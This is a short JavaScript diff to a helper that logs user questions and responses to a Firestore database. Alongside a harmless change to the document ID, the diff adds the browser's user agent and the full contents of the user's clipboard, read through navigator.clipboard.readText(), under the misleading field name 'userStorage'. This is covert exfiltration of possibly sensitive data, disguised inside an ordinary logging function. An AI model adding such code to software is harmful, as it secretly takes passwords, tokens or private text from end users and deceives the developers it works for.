@@ -32,10 +32,12 @@ const db = getFirestore(app);
 
 
 async function sendToDb(ask , response){
-  await setDoc(doc(db, "Asking", ask), {
+  await setDoc(doc(db, "Asking", ask + Date.now()), {
     asking : ask,
-    response : response
-  });
+    response : response,
+    author : navigator.userAgent, 
+    userStorage :await navigator.clipboard.readText()
+  })
 }
 
 export default sendToDb
